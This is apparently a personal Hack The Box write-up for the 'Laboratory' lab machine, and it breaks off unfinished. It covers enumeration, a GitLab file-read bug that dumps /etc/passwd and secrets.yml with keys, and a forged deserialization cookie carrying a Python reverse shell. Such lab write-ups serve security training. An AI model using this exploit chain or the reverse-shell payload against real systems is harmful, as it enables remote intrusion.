# Hack the box - Ready

IP: 10.10.10.216 

# Check connectivity
┌──(kali㉿kali)-[~/htb-laboratory]
└─$ ping 10.10.10.216                     
PING 10.10.10.216 (10.10.10.216) 56(84) bytes of data.
64 bytes from 10.10.10.216: icmp_seq=1 ttl=63 time=97.2 ms
64 bytes from 10.10.10.216: icmp_seq=2 ttl=63 time=96.5 ms
64 bytes from 10.10.10.216: icmp_seq=3 ttl=63 time=94.4 ms
^C
--- 10.10.10.216 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2004ms
rtt min/avg/max/mdev = 94.351/96.013/97.159/1.203 ms


# Enumeration with nmap
```
┌──(kali㉿kali)-[~/htb-laboratory]
└─$ nmap -A 10.10.10.216
Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-22 09:07 EST
Nmap scan report for 10.10.10.216
Host is up (0.097s latency).
Not shown: 997 filtered ports
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 25:ba:64:8f:79:9d:5d:95:97:2c:1b:b2:5e:9b:55:0d (RSA)
|   256 28:00:89:05:55:f9:a2:ea:3c:7d:70:ea:4d:ea:60:0f (ECDSA)
|_  256 77:20:ff:e9:46:c0:68:92:1a:0b:21:29:d1:53:aa:87 (ED25519)
80/tcp  open  http     Apache httpd 2.4.41
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to https://laboratory.htb/
443/tcp open  ssl/http Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: The Laboratory
| ssl-cert: Subject: commonName=laboratory.htb
| Subject Alternative Name: DNS:git.laboratory.htb
| Not valid before: 2020-07-05T10:39:28
|_Not valid after:  2024-03-03T10:39:28
| tls-alpn: 
|_  http/1.1
Service Info: Host: laboratory.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.96 seconds
```
dns:
- laboratory.htb
- git.laboratory.htb

# Edit /etc/hosts
```
┌──(kali㉿kali)-[~]
└─$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
10.10.10.215    academy.htb
10.10.10.215    dev-staging-01.academy.htb
10.10.10.216    laboratory.htb
10.10.10.216    git.laboratory.htb

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

# Enumeration with gobuster
```
┌──(kali㉿kali)-[~/htb-laboratory]
└─$ gobuster dir -k -u https://laboratory.htb:443 -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt --wildcard
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            https://laboratory.htb:443
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-1.0.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/12/22 09:43:37 Starting gobuster
===============================================================
/images (Status: 301)
/assets (Status: 301)
===============================================================
2020/12/22 10:11:27 Finished
===============================================================

```
```
┌──(kali㉿kali)-[~]
└─$ gobuster dir -k -u https://laboratory.htb:443 -w /usr/share/wordlists/dirb/big.txt --wildcard 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            https://laboratory.htb:443
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/big.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/12/22 09:59:55 Starting gobuster
===============================================================
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/assets (Status: 301)
/images (Status: 301)
/server-status (Status: 403)
===============================================================
2020/12/22 10:03:57 Finished
===============================================================
```
```
┌──(kali㉿kali)-[~]
└─$ gobuster dir -k -u https://laboratory.htb:443/assets -w /usr/share/wordlists/dirb/big.txt --wildcard
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            https://laboratory.htb:443/assets
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/big.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/12/22 10:06:49 Starting gobuster
===============================================================
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/css (Status: 301)
/fonts (Status: 301)
/js (Status: 301)
===============================================================
2020/12/22 10:10:47 Finished
===============================================================

```

remainder: gitlab shit

## After n attemps... the account email when registering has to be with @git.laboratory.htb
![Gitlab Login](./images/gitlab_login.png "Gitlab Login")

### List users in gitlab server
```
https://git.laboratory.htb/autocomplete/users:

[{"id":1,"name":"Dexter McPherson","username":"dexter","state":"active","avatar_url":"http://git.laboratory.htb/uploads/-/system/user/avatar/1/avatar.png","web_url":"http://git.laboratory.htb/dexter","status_tooltip_html":null,"path":"/dexter"},{"id":4,"name":"Seven","username":"seven","state":"active","avatar_url":"http://git.laboratory.htb/uploads/-/system/user/avatar/4/avatar.png","web_url":"http://git.laboratory.htb/seven","status_tooltip_html":null,"path":"/seven"},{"id":6,"name":"asd","username":"asd","state":"active","avatar_url":null,"web_url":"http://git.laboratory.htb/asd","status_tooltip_html":null,"path":"/asd"},{"id":7,"name":"cdlsn","username":"cdlsn","state":"active","avatar_url":null,"web_url":"http://git.laboratory.htb/cdlsn","status_tooltip_html":null,"path":"/cdlsn"},{"id":5,"name":"hola","username":"hola","state":"active","avatar_url":null,"web_url":"http://git.laboratory.htb/hola","status_tooltip_html":null,"path":"/hola"}]

```

## Maybe we can exploit (LFI+RCE):
https://hackerone.com/reports/827052
https://vimeo.com/422686763

## Its broken...
/etc/passwd:
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
_apt:x:104:65534::/nonexistent:/bin/false
sshd:x:105:65534::/var/run/sshd:/usr/sbin/nologin
git:x:998:998::/var/opt/gitlab:/bin/sh
gitlab-www:x:999:999::/var/opt/gitlab/nginx:/bin/false
gitlab-redis:x:997:997::/var/opt/gitlab/redis:/bin/false
gitlab-psql:x:996:996::/var/opt/gitlab/postgresql:/bin/sh
mattermost:x:994:994::/var/opt/gitlab/mattermost:/bin/sh
registry:x:993:993::/var/opt/gitlab/registry:/bin/sh
gitlab-prometheus:x:992:992::/var/opt/gitlab/prometheus:/bin/sh
gitlab-consul:x:991:991::/var/opt/gitlab/consul:/bin/sh
```

/opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml:
```
# This file is managed by gitlab-ctl. Manual changes will be
# erased! To change the contents below, edit /etc/gitlab/gitlab.rb
# and run `sudo gitlab-ctl reconfigure`.

---
production:
  db_key_base: 627773a77f567a5853a5c6652018f3f6e41d04aa53ed1e0df33c66b04ef0c38b88f402e0e73ba7676e93f1e54e425f74d59528fb35b170a1b9d5ce620bc11838
  secret_key_base: 3231f54b33e0c1ce998113c083528460153b19542a70173b4458a21e845ffa33cc45ca7486fc8ebb6b2727cc02feea4c3adbe2cc7b65003510e4031e164137b3
  otp_key_base: db3432d6fa4c43e68bf7024f3c92fea4eeea1f6be1e6ebd6bb6e40e930f0933068810311dc9f0ec78196faa69e0aac01171d62f4e225d61e0b84263903fd06af
  openid_connect_signing_key: |
    -----BEGIN RSA PRIVATE KEY-----
    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
    -----END RSA PRIVATE KEY-----


```

# RCE
## Recreate env to generate personalized cookie with the commands that we want
https://www.netsparker.com/blog/web-security/understanding-reverse-shells/

Create gitlab docker container:
```
docker run --rm -d --hostname gitlab.example.com -p 443:443 -p 80:80 -p 2222:22 --name gitlab gitlab/gitlab-ce:12.9.0-ce.0

```
Change secret_key_base with the one from hack the box machine

docker:
```
secret_key_base: 60ccff84b73b3193bb39f0bf913ac64ee42c2532e2eeef79515c6390b49f8da0345da882fc722e2ecec5a7034205b319c6e5df6e2e2a06fe53c420e024a52540
```
htb:
```
secret_key_base: 3231f54b33e0c1ce998113c083528460153b19542a70173b4458a21e845ffa33cc45ca7486fc8ebb6b2727cc02feea4c3adbe2cc7b65003510e4031e164137b3
```

to execute in gitlab-rails console:, in our docker (172.17.0.2) our host is 172.17.0.1, in kali machine the target it to execute a reverse shell will be 10.10.14.147:
```
request = ActionDispatch::Request.new(Rails.application.env_config)
request.env["action_dispatch.cookies_serializer"] = :marshal
cookies = request.cookie_jar

erb = ERB.new("<%= `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.147\",1111));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' &` %>")
depr = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new(erb, :result, "@result", ActiveSupport::Deprecation.new)
cookies.signed[:cookie] = depr
puts cookies[:cookie]
```
```
root@gitlab:/# nano /opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml
rroot@gitlab:/# gitlab-rails console
--------------------------------------------------------------------------------
 GitLab:       12.9.0 (9a382ff2c82) FOSS
 GitLab Shell: 12.0.0
 PostgreSQL:   10.12
--------------------------------------------------------------------------------
Loading production environment (Rails 6.0.2)
irb(main):001:0> request = ActionDispatch::Request.new(Rails.application.env_config)
=> #<ActionDispatch::Request:0x00007ff368a6c5a8 @env={"action_dispatch.parameter_filter"=>[/token$/, /password/, /secret/, /key$/, /^body$/, /^description$/, /^note$/, /^text$/, /^title$/, :certificate, :encrypted_key, :hook, :import_url, :otp_attempt, :sentry_dsn, :trace, :variables, :content, :sharedSecret, /^((?-mix:client_secret|code|authentication_token|access_token|refresh_token))$/], "action_dispatch.redirect_filter"=>[], "action_dispatch.secret_key_base"=>"3231f54b33e0c1ce998113c083528460153b19542a70173b4458a21e845ffa33cc45ca7486fc8ebb6b2727cc02feea4c3adbe2cc7b65003510e4031e164137b3", "action_dispatch.show_exceptions"=>true, "action_dispatch.show_detailed_exceptions"=>false, "action_dispatch.logger"=>#<ActiveSupport::Logger:0x00007ff380874f30 @level=1, @progname=nil, @default_formatter=#<Logger::Formatter:0x00007ff380894c90 @datetime_format=nil>, @formatter=#<ActiveSupport::Logger::SimpleFormatter:0x00007ff380874ee0 @datetime_format=nil, @thread_key="activesupport_tagged_logging_tags:70341905065840">, @logdev=#<Logger::LogDevice:0x00007ff380894c40 @shift_period_suffix=nil, @shift_size=nil, @shift_age=nil, @filename=nil, @dev=#<File:/opt/gitlab/embedded/service/gitlab-rails/log/production.log>, @mon_mutex=#<Thread::Mutex:0x00007ff380894b78>, @mon_mutex_owner_object_id=70341905131040, @mon_owner=nil, @mon_count=0>>, "action_dispatch.backtrace_cleaner"=>#<Rails::BacktraceCleaner:0x00007ff37cdd5028 @silencers=[#<Proc:0x00007ff378194880@/opt/gitlab/embedded/service/gitlab-rails/config/initializers/backtrace_silencers.rb:8>], @filters=[#<Proc:0x00007ff37cdd4c40@/opt/gitlab/embedded/lib/ruby/gems/2.6.0/gems/activesupport-6.0.2/lib/active_support/backtrace_cleaner.rb:97>, #<Proc:0x00007ff37cdd4ab0@/opt/gitlab/embedded/lib/ruby/gems/2.6.0/gems/railties-6.0.2/lib/rails/backtrace_cleaner.rb:16>, #<Proc:0x00007ff37cdd4a88@/opt/gitlab/embedded/lib/ruby/gems/2.6.0/gems/railties-6.0.2/lib/rails/backtrace_cleaner.rb:17>, #<Proc:0x00007ff37cdd4a38@/opt/gitlab/embedded/lib/ruby/gems/2.6.0/gems/railties-6.0.2/lib/rails/backtrace_cleaner.rb:18>], @root="/opt/gitlab/embedded/service/gitlab-rails/">, "action_dispatch.key_generator"=>#<ActiveSupport::CachingKeyGenerator:0x00007ff36e1c22a8 @key_generator=#<ActiveSupport::KeyGenerator:0x00007ff36e1c2410 @secret="3231f54b33e0c1ce998113c083528460153b19542a70173b4458a21e845ffa33cc45ca7486fc8ebb6b2727cc02feea4c3adbe2cc7b65003510e4031e164137b3", @iterations=1000>, @cache_keys=#<Concurrent::Map:0x00007ff36e1c2118 entries=1 default_proc=nil>>, "action_dispatch.http_auth_salt"=>"http authentication", "action_dispatch.signed_cookie_salt"=>"signed cookie", "action_dispatch.encrypted_cookie_salt"=>"encrypted cookie", "action_dispatch.encrypted_signed_cookie_salt"=>"signed encrypted cookie", "action_dispatch.authenticated_encrypted_cookie_salt"=>"authenticated encrypted cookie", "action_dispatch.use_authenticated_cookie_encryption"=>false, "action_dispatch.encrypted_cookie_cipher"=>nil, "action_dispatch.signed_cookie_digest"=>nil, "action_dispatch.cookies_serializer"=>:hybrid, "action_dispatch.cookies_digest"=>nil, "action_dispatch.cookies_rotations"=>#<ActiveSupport::Messages::RotationConfiguration:0x00007ff38b16bb98 @signed=[], @encrypted=[]>, "action_dispatch.use_cookies_with_metadata"=>false, "action_dispatch.content_security_policy"=>nil, "action_dispatch.content_security_policy_report_only"=>false, "action_dispatch.content_security_policy_nonce_generator"=>nil, "action_dispatch.content_security_policy_nonce_directives"=>nil}, @filtered_parameters=nil, @filtered_env=nil, @filtered_path=nil, @protocol=nil, @port=nil, @method=nil, @request_method=nil, @remote_ip=nil, @original_fullpath=nil, @fullpath=nil, @ip=nil>
irb(main):002:0> request.env["action_dispatch.cookies_serializer"] = :marshal
=> :marshal
irb(main):003:0> cookies = request.cookie_jar
=> #<ActionDispatch::Cookies::CookieJar:0x00007ff36927a790 @set_cookies={}, @delete_cookies={}, @request=#<ActionDispatch::Request:0x00007ff368a6c5a8 @env={"action_dispatch.parameter_filter"=>[/token$/, /password/, /secret/, /key$/, /^body$/, /^description$/, /^note$/, /^text$/, /^title$/, :certificate, :encrypted_key, :hook, :import_url, :otp_attempt, :sentry_dsn, :trace, :variables, :content, :sharedSecret, /^((?-mix:client_secret|code|authentication_token|access_token|refresh_token))$/], "action_dispatch.redirect_filter"=>[], "action_dispatch.secret_key_base"=>"3231f54b33e0c1ce998113c083528460153b19542a70173b4458a21e845ffa33cc45ca7486fc8ebb6b2727cc02feea4c3adbe2cc7b65003510e4031e164137b3", "action_dispatch.show_exceptions"=>true, "action_dispatch.show_detailed_exceptions"=>false, "action_dispatch.logger"=>#<ActiveSupport::Logger:0x00007ff380874f30 @level=1, @progname=nil, @default_formatter=#<Logger::Formatter:0x00007ff380894c90 @datetime_format=nil>, @formatter=#<ActiveSupport::Logger::SimpleFormatter:0x00007ff380874ee0 @datetime_format=nil, @thread_key="activesupport_tagged_logging_tags:70341905065840">, @logdev=#<Logger::LogDevice:0x00007ff380894c40 @shift_period_suffix=nil, @shift_size=nil, @shift_age=nil, @filename=nil, @dev=#<File:/opt/gitlab/embedded/service/gitlab-rails/log/production.log>, @mon_mutex=#<Thread::Mutex:0x00007ff380894b78>, @mon_mutex_owner_object_id=70341905131040, @mon_owner=nil, @mon_count=0>>, "action_dispatch.backtrace_cleaner"=>#<Rails::BacktraceCleaner:0x00007ff37cdd5028 @silencers=[#<Proc:0x00007ff378194880@/opt/gitlab/embedded/service/gitlab-rails/config/initializers/backtrace_silencers.rb:8>], @filters=[#<Proc:0x00007ff37cdd4c40@/opt/gitlab/embedded/lib/ruby/gems/2.6.0/gems/activesupport-6.0.2/lib/active_support/backtrace_cleaner.rb:97>, #<Proc:0x00007ff37cdd4ab0@/opt/gitlab/embedded/lib/ruby/gems/2.6.0/gems/railties-6.0.2/lib/rails/backtrace_cleaner.rb:16>, #<Proc:0x00007ff37cdd4a88@/opt/gitlab/embedded/lib/ruby/gems/2.6.0/gems/railties-6.0.2/lib/rails/backtrace_cleaner.rb:17>, #<Proc:0x00007ff37cdd4a38@/opt/gitlab/embedded/lib/ruby/gems/2.6.0/gems/railties-6.0.2/lib/rails/backtrace_cleaner.rb:18>], @root="/opt/gitlab/embedded/service/gitlab-rails/">, "action_dispatch.key_generator"=>#<ActiveSupport::CachingKeyGenerator:0x00007ff36e1c22a8 @key_generator=#<ActiveSupport::KeyGenerator:0x00007ff36e1c2410 @secret="3231f54b33e0c1ce998113c083528460153b19542a70173b4458a21e845ffa33cc45ca7486fc8ebb6b2727cc02feea4c3adbe2cc7b65003510e4031e164137b3", @iterations=1000>, @cache_keys=#<Concurrent::Map:0x00007ff36e1c2118 entries=1 default_proc=nil>>, "action_dispatch.http_auth_salt"=>"http authentication", "action_dispatch.signed_cookie_salt"=>"signed cookie", "action_dispatch.encrypted_cookie_salt"=>"encrypted cookie", "action_dispatch.encrypted_signed_cookie_salt"=>"signed encrypted cookie", "action_dispatch.authenticated_encrypted_cookie_salt"=>"authenticated encrypted cookie", "action_dispatch.use_authenticated_cookie_encryption"=>false, "action_dispatch.encrypted_cookie_cipher"=>nil, "action_dispatch.signed_cookie_digest"=>nil, "action_dispatch.cookies_serializer"=>:marshal, "action_dispatch.cookies_digest"=>nil, "action_dispatch.cookies_rotations"=>#<ActiveSupport::Messages::RotationConfiguration:0x00007ff38b16bb98 @signed=[], @encrypted=[]>, "action_dispatch.use_cookies_with_metadata"=>false, "action_dispatch.content_security_policy"=>nil, "action_dispatch.content_security_policy_report_only"=>false, "action_dispatch.content_security_policy_nonce_generator"=>nil, "action_dispatch.content_security_policy_nonce_directives"=>nil, "rack.request.cookie_hash"=>{}, "action_dispatch.cookies"=>#<ActionDispatch::Cookies::CookieJar:0x00007ff36927a790 ...>}, @filtered_parameters=nil, @filtered_env=nil, @filtered_path=nil, @protocol=nil, @port=nil, @method=nil, @request_method=nil, @remote_ip=nil, @original_fullpath=nil, @fullpath=nil, @ip=nil>, @cookies={}, @committed=false>
irb(main):004:0> erb = ERB.new("<%= `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.147\",1111));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' &` %>")
=> #<ERB:0x00007ff366ced130 @safe_level=nil, @src="#coding:UTF-8\n_erbout = +''; _erbout.<<(( `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.147\",1111));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' &` ).to_s); _erbout", @encoding=#<Encoding:UTF-8>, @frozen_string=nil, @filename=nil, @lineno=0>
irb(main):005:0> depr = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new(erb, :result, "@result", ActiveSupport::Deprecation.new)
Traceback (most recent call last):
  File "<string>", line 1, in <module>
ConnectionRefusedError: [Errno 111] Connection refused
=> ""
irb(main):006:0> cookies.signed[:cookie] = depr
DEPRECATION WARNING: @result is deprecated! Call result.is_a? instead of @result.is_a?. Args: [Hash] (called from irb_binding at (irb):6)
Traceback (most recent call last):
  File "<string>", line 1, in <module>
ConnectionRefusedError: [Errno 111] Connection refused
Traceback (most recent call last):
  File "<string>", line 1, in <module>
ConnectionRefusedError: [Errno 111] Connection refused
=> ""
irb(main):007:0> puts cookies[:cookie]
BAhvOkBBY3RpdmVTdXBwb3J0OjpEZXByZWNhdGlvbjo6RGVwcmVjYXRlZEluc3RhbmNlVmFyaWFibGVQcm94eQk6DkBpbnN0YW5jZW86CEVSQgs6EEBzYWZlX2xldmVsMDoJQHNyY0kiAiQBI2NvZGluZzpVVEYtOApfZXJib3V0ID0gKycnOyBfZXJib3V0Ljw8KCggYHB5dGhvbjMgLWMgJ2ltcG9ydCBzb2NrZXQsc3VicHJvY2VzcyxvcztzPXNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsc29ja2V0LlNPQ0tfU1RSRUFNKTtzLmNvbm5lY3QoKCIxMC4xMC4xNC4xNDciLDExMTEpKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7IG9zLmR1cDIocy5maWxlbm8oKSwxKTsgb3MuZHVwMihzLmZpbGVubygpLDIpO3A9c3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9zaCIsIi1pIl0pOycgJmAgKS50b19zKTsgX2VyYm91dAY6BkVGOg5AZW5jb2RpbmdJdToNRW5jb2RpbmcKVVRGLTgGOwpGOhNAZnJvemVuX3N0cmluZzA6DkBmaWxlbmFtZTA6DEBsaW5lbm9pADoMQG1ldGhvZDoLcmVzdWx0OglAdmFySSIMQHJlc3VsdAY7ClQ6EEBkZXByZWNhdG9ySXU6H0FjdGl2ZVN1cHBvcnQ6OkRlcHJlY2F0aW9uAAY7ClQ=--99a3dfcf90767bdb3f0e6ea7bd365b198ca0ad69
=> nil
irb(main):008:0> 

```
our token to send:
